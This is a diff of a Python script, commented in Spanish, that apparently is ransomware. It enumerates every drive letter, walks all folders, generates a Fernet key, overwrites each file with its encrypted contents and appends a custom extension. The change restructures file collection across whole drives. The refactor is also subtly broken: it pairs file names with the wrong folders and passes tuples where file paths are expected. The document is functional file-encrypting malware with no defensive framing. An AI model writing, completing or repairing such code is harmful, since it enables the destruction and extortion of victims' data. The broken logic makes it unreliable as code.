@@ -40,18 +40,14 @@ def cargar_key():
 
 
 # Función para encriptar los archivos y su renombramiento con la extensión personalizada.
-def encrypt(items, key):
+def encrypt(item, key):
     f = Fernet(key)
-    for item in items:
-        with open(item, 'rb') as file:
-            file_data = file.read()
-
-        encrypted_data = f.encrypt(file_data)
-
-        with open(item, 'wb') as file:
-            file.write(encrypted_data)
-
-        os.rename(item, item + '.' + extension)
+    with open(item, 'rb') as file:
+        file_data = file.read()
+    encrypted_data = f.encrypt(file_data)
+    with open(item, 'wb') as file:
+        file.write(encrypted_data)
+    os.rename(item, item + '.' + extension)
 
 
 
@@ -63,12 +59,13 @@ def find_drives():
             L.add(drive.upper()+":\\")
     return L
 
-def listar_dirs(rute):
+
+def listar_files_in_dirs(rute):
     for root, dirs, files in os.walk(rute):
         for directorio in dirs:
-            yield os.path.join(root, directorio)
-
-
+            new_dir = os.path.join(root, directorio)
+            # Cambiar a lista en lugar de set
+            yield tuple(os.path.join(new_dir, fileName) for fileName in files)
 
 
 
@@ -81,31 +78,21 @@ if __name__ == '__main__':
             print("Permisos de administrador concedidos.")
             sys.exit()
     try:
-        # Directorio que vamos a cifrar.
-        directories = set()
+        files = set()
         for drive in find_drives():
-            directories.update(listar_dirs(drive))
+            files.update(listar_files_in_dirs(drive))
         
 
         # Generación la clave de cifrado y se almacena en una variable.
         generar_key()
         key = cargar_key()
 
-        while directories:
-            path = directories.pop()
+        while files:
+            path = files.pop()
             print(path)
             try:
-                print(f'Intentando acceder a {path}')
-                os.chdir(path)
-                itemsInPath = os.listdir(path)
-                print(itemsInPath)
-                files = set()
-                for item in itemsInPath:
-                    if os.path.isdir(path+item):
-                        directories.add(path+item+"\\")
-                    else:
-                        files.add(path+item)
-                encrypt(files, key)
+                print(f'Intentando cifrar {path}')
+                encrypt(path, key)
 
             except Exception as e:
                 print('Error:', e)
